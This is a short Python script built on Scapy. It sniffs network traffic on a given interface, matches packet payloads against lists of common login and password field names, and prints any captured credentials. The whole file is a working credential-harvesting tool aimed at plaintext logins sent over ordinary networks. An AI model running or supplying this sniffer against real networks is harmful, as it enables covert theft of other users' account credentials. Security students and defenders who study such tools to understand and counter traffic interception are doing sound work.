from scapy.all import *
from urllib import parse
import re


class Sniffer:

    def __init__(self, iface):
        self.iface = iface


    def packetParser(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
            body = str(packet[TCP].payload.load)
            #print(str(body.load))
            #input()
            userDetail = self.getLoginPass(body)
            if userDetail != None:
                print(parse.unquote(userDetail[0]))
                print(parse.unquote(userDetail[1]))
        else:
            pass



    def getLoginPass(self, body):
        
        user = None
        passwd = None

        userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'uname', 'nickname', 'user', 'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'login_id']
        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'passwrd']

        for login in userfields:
            loginRegex = re.search('(%s=[^&]+)'%login, body, re.IGNORECASE)
            if loginRegex:
                user = loginRegex.group()

        for passfield in passfields:
            passRegex = re.search('(%s=[^&]+)'%passfield, body, re.IGNORECASE)
            if passRegex:
                passwd = passRegex.group()

        if user and passwd:
            return (user, passwd)


    def sniffing(self):
        print("***STARTING PACKET SNIFFING***")
        try:
            sniff(iface = self.iface, prn = self.packetParser, store=0)
        except KeyboardInterrupt:
            print('[-] Exiting')
            return 0
